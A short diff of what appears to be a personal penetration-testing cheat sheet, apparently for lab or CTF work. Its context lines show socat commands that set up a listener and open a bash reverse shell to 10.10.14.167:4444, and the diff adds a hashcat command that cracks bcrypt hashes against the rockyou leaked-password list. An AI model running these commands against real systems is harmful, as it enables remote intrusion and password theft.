@@ -20,4 +20,7 @@ socat file:`tty`,raw,echo=0 tcp-listen:4444
 
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.167:4444
 
+hashcat -m 3200 -a 0 -o cracked.txt bcrypt_hashes.txt C:/Users/henry/git/SecLists/Passwords/Leaked-Databases/rockyou.txt
+
+
 ```
